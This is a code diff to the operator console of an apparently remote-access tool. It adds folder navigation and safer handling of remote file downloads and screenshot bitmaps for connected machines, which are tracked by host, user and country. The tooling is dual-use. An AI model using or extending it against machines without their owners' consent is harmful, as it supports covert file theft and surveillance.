@@ -9,7 +9,6 @@ struct Client {
   TlsCtx tls;
   char host[256], user[256], os[256], country[64];
   HWND wnd[K_COUNT];
-  char shellPending[MAX_PATH];
   char* shotBmp; uint32_t shotBmpLen;
 };
 struct Shot { Client* c; char* bmp; uint32_t len; };
@@ -102,11 +101,26 @@ static void FillFiles(Client* c, char* pl, uint32_t plLen) {
   }
 }
 static void SaveFile(Client* c, const char* pl, uint32_t plLen) {
-  if (!c->wnd[K_FILES] || !plLen) return;
+  if (!c->wnd[K_FILES] || plLen < 3) return;
+  const char* nl = (const char*)memchr(pl + 1, '\n', plLen - 1); if (!nl) return;
+  if (pl[0] == 'E') {
+    char msg[256]; size_t mlen = (size_t)(nl - pl) - 1; if (mlen > sizeof(msg) - 24) mlen = sizeof(msg) - 24;
+    memcpy(msg, "Download failed: ", 17); memcpy(msg + 17, pl + 1, mlen); msg[17 + mlen] = 0;
+    MessageBoxA(c->wnd[K_FILES], msg, "Download", MB_ICONWARNING); return;
+  }
+  if (pl[0] != 'D') return;
+  size_t pathLen = (size_t)(nl - pl) - 1, start = 1;
+  for (size_t i = 1; i <= pathLen; i++) if (pl[i] == '\\' || pl[i] == '/') start = i + 1;
+  char name[MAX_PATH]; size_t k = 0;
+  for (size_t i = start; i <= pathLen && k < sizeof(name) - 1; i++) {
+    unsigned char ch = (unsigned char)pl[i]; name[k++] = ch < 32 || strchr("<>:\"/\\|?*", ch) ? '_' : (char)ch;
+  }
+  name[k] = 0;
+  if (!name[0] || !strcmp(name, ".") || !strcmp(name, "..")) strcpy(name, "last.bin");
+  uint32_t off = (uint32_t)(nl + 1 - pl), dataLen = plLen - off;
   CreateDirectoryA("downloads", NULL);
-  char name[MAX_PATH]; snprintf(name, sizeof(name), "%s", c->shellPending[0] ? c->shellPending : "last.bin");
   char outPath[MAX_PATH + 16]; snprintf(outPath, sizeof(outPath), "downloads\\%s", name);
-  if (WriteFileAll(outPath, pl, plLen)) MessageBoxA(c->wnd[K_FILES], outPath, "Saved", MB_ICONINFORMATION);
+  if (WriteFileAll(outPath, pl + off, dataLen)) MessageBoxA(c->wnd[K_FILES], outPath, "Saved", MB_ICONINFORMATION);
   else MessageBoxA(c->wnd[K_FILES], "Write failed", "Save", MB_ICONERROR);
 }
 static DWORD WINAPI ClientThread(LPVOID p) {
@@ -163,6 +177,7 @@ static DWORD WINAPI AcceptThread(LPVOID) {
 #define IDC_FPATH 301
 #define IDC_FREFRESH 302
 #define IDC_FGET 303
+#define IDC_FENTER 304
 #define IDC_LIST 101
 #define IDC_PORT 102
 #define IDC_LISTEN 103
@@ -196,6 +211,31 @@ static LRESULT CALLBACK ShellEditProc(HWND h, UINT m, WPARAM wp, LPARAM lp, UINT
   if (m == WM_KEYDOWN && wp == VK_RETURN) { SendMessageA(GetParent(h), WM_COMMAND, MAKEWPARAM(IDC_SHELLSEND, BN_CLICKED), 0); return 0; }
   return DefSubclassProc(h, m, wp, lp);
 }
+static bool SelIsDir(HWND lv) {
+  char a[32] = ""; int sel = ListView_GetNextItem(lv, -1, LVNI_SELECTED); if (sel < 0) return false;
+  ListView_GetItemText(lv, sel, 1, a, sizeof(a)); size_t n = strlen(a); return n && a[n - 1] == 'd';
+}
+static void JoinPath(char* out, size_t n, const char* base, const char* name) {
+  if (!strcmp(name, ".")) { snprintf(out, n, "%s", base); return; }
+  if (!strcmp(name, "..")) {
+    snprintf(out, n, "%s", base); char* s = strrchr(out, '\\');
+    if (s && s > out + 2) *s = 0; else if (out[1] == ':') snprintf(out, n, "%.2s\\", out);
+    return;
+  }
+  snprintf(out, n, "%s\\%s", base, name);
+}
+static void FilesNav(Client* c, HWND h) {
+  HWND lv = GetDlgItem(h, 1); char p[MAX_PATH], full[MAX_PATH * 2];
+  GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
+  if (!SelIsDir(lv)) { TlsSendMsg(&c->tls, C_FS_LIST, p, strlen(p)); return; }
+  char name[MAX_PATH]; int sel = ListView_GetNextItem(lv, -1, LVNI_SELECTED); ListView_GetItemText(lv, sel, 0, name, sizeof(name));
+  JoinPath(full, sizeof(full), p, name); SetWindowTextA(GetDlgItem(h, IDC_FPATH), full);
+  TlsSendMsg(&c->tls, C_FS_LIST, full, strlen(full));
+}
+static LRESULT CALLBACK FilesListProc(HWND h, UINT m, WPARAM wp, LPARAM lp, UINT_PTR, DWORD_PTR) {
+  if (m == WM_KEYDOWN && wp == VK_RETURN) { SendMessageA(GetParent(h), WM_COMMAND, MAKEWPARAM(IDC_FENTER, BN_CLICKED), 0); return 0; }
+  return DefSubclassProc(h, m, wp, lp);
+}
 static void ChildCommand(Client* c, int kind, HWND h, int id) {
   if (!c) return;
   if (kind == K_SHELL && id == IDC_SHELLSEND) {
@@ -206,23 +246,25 @@ static void ChildCommand(Client* c, int kind, HWND h, int id) {
     char p[MAX_PATH]; GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
     TlsSendMsg(&c->tls, C_FS_LIST, p, strlen(p));
   } else if (kind == K_FILES && id == IDC_FGET) {
+    if (SelIsDir(GetDlgItem(h, 1))) { MessageBoxA(h, "Select a file, not a folder", "Download", MB_ICONINFORMATION); return; }
     char name[MAX_PATH]; int sel = ListView_GetNextItem(GetDlgItem(h, 1), -1, LVNI_SELECTED);
     if (sel < 0) return;
     ListView_GetItemText(GetDlgItem(h, 1), sel, 0, name, sizeof(name));
     char p[MAX_PATH]; GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
     char full[MAX_PATH * 2 + 2]; snprintf(full, sizeof(full), "%s\\%s", p, name);
-    snprintf(c->shellPending, sizeof(c->shellPending), "%s", name);
     TlsSendMsg(&c->tls, C_FS_GET, full, strlen(full));
-  }
+  } else if (kind == K_FILES && id == IDC_FENTER) FilesNav(c, h);
 }
 static bool BmpOk(Client* c) {
   if (!c->shotBmp || c->shotBmpLen < sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)) return false;
   BITMAPFILEHEADER* fh = (BITMAPFILEHEADER*)c->shotBmp; BITMAPINFOHEADER* ih = (BITMAPINFOHEADER*)(c->shotBmp + sizeof(*fh));
   if (fh->bfType != 0x4D42 || ih->biSize < sizeof(BITMAPINFOHEADER) || fh->bfOffBits < sizeof(*fh) + ih->biSize) return false;
-  int w = ih->biWidth, h = ih->biHeight < 0 ? -ih->biHeight : ih->biHeight;
-  if (w <= 0 || h <= 0 || w > 16384 || h > 16384 || ih->biBitCount < 1 || ih->biBitCount > 32) return false;
+  if (ih->biPlanes != 1 || ih->biCompression != BI_RGB) return false;
+  switch (ih->biBitCount) { case 1: case 4: case 8: case 16: case 24: case 32: break; default: return false; }
+  int64_t w = ih->biWidth, h = ih->biHeight < 0 ? -(int64_t)ih->biHeight : ih->biHeight;
+  if (w <= 0 || h <= 0 || w > 16384 || h > 16384) return false;
   uint64_t row = ((uint64_t)w * ih->biBitCount + 31) / 32 * 4;
-  return fh->bfOffBits + row * h <= c->shotBmpLen;
+  return fh->bfOffBits + row * (uint64_t)h <= c->shotBmpLen;
 }
 static void ChildPaint(Client* c, HWND h) {
   PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
@@ -243,6 +285,7 @@ static LRESULT CALLBACK ChildProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
     case WM_SIZE: if (kind >= 0) ChildLayout(h, kind, LOWORD(lp), HIWORD(lp)); return 0;
     case WM_COMMAND: if (kind >= 0) ChildCommand(c, kind, h, LOWORD(wp)); return 0;
     case WM_PAINT: if (kind == K_SHOT) { ChildPaint(c, h); return 0; } break;
+    case WM_NOTIFY: { NMHDR* nh = (NMHDR*)lp; if (kind == K_FILES && nh && nh->idFrom == 1 && nh->code == NM_DBLCLK) { FilesNav(c, h); return 0; } break; }
     case WM_DESTROY: if (kind >= 0) c->wnd[kind] = NULL; SetWindowLongPtrA(h, GWLP_USERDATA, 0); return 0;
   }
   return DefWindowProcA(h, m, wp, lp);
@@ -270,7 +313,7 @@ static void OpenFiles(Client* c) {
   HWND h = c->wnd[K_FILES] = MakeChild("OAFiles", title, K_FILES, c, 760, 520); if (!h) return;
   CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "C:\\", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_FPATH, g_inst, NULL);
   CreateWindowExA(0, "BUTTON", "Refresh", WS_CHILD | WS_VISIBLE, 0, 0, 84, 24, h, (HMENU)IDC_FREFRESH, g_inst, NULL);
-  HWND lv = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
+  HWND lv = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL); SetWindowSubclass(lv, FilesListProc, 0, 0);
   ListView_SetExtendedListViewStyle(lv, LVS_EX_FULLROWSELECT);
   LVCOLUMNA col = {0}; col.mask = LVCF_TEXT | LVCF_WIDTH;
   col.pszText = (LPSTR)"Name"; col.cx = 300; ListView_InsertColumn(lv, 0, &col); col.pszText = (LPSTR)"Size|Attr"; col.cx = 160; ListView_InsertColumn(lv, 1, &col);
